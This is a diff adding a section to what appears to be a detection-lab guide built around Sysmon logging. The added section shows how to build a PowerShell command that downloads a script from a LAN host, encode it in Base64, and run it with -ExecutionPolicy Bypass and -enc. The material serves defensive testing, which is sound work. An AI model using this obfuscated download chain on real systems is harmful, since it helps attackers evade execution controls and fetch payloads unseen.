@@ -54,6 +54,36 @@ New-Item -ItemType Directory -Path C:\temp -Force
 powershell -Command "Invoke-WebRequest -Uri http://192.168.1.4/test.ps1 -OutFile C:\temp\test.ps1"
 ```
 
+**Command 4: Create, encode, and execute a download command (Complete Process)**
+
+This demonstrates the full attack chain: creating a malicious command, encoding it, and executing it:
+
+**Step 1: Create the command to download a script**
+```powershell
+$cmd = '$url = "http://192.168.1.4:8080/test3.ps1"; $out = "C:\temp\test3.ps1"; Invoke-WebRequest -Uri $url -OutFile $out'
+```
+
+**Step 2: Encode the command in Base64**
+```powershell
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
+$enc = [Convert]::ToBase64String($bytes)
+Write-Host "Encoded command:"
+$enc
+```
+
+**Step 3: Execute the encoded command**
+```powershell
+powershell -NoProfile -ExecutionPolicy Bypass -enc JAB1AHIAbAAgAD0AIAAiAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgA0ADoAOAAwADgAMAAvAHQAZQBzAHQAMwAuAHAAcwAxACIAOwAgACQAbwB1AHQAIAA9ACAAIgBDADoAXAB0AGUAbQBwAFwAdABlAHMAdAAzAC4AcABzADEAIgA7ACAASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACQAdQByAGwAIAAtAE8AdQB0AEYAaQBsAGUAIAAkAG8AdQB0AA==
+```
+
+**What this demonstrates:**
+- Creating a PowerShell command that downloads a script from a remote server
+- Encoding the command in Base64 using Unicode encoding (common obfuscation technique)
+- Executing the encoded command with `-NoProfile`, `-ExecutionPolicy Bypass`, and `-enc` flags
+- This is a complete example of how attackers obfuscate download-and-execute attacks
+
+**Note:** Make sure `C:\temp` directory exists before running the encoded command, or the download will fail (but Sysmon will still log the attempt).
+
 ### 1.4 Run More PowerShell Activity
 
 **Generate additional PowerShell events:**
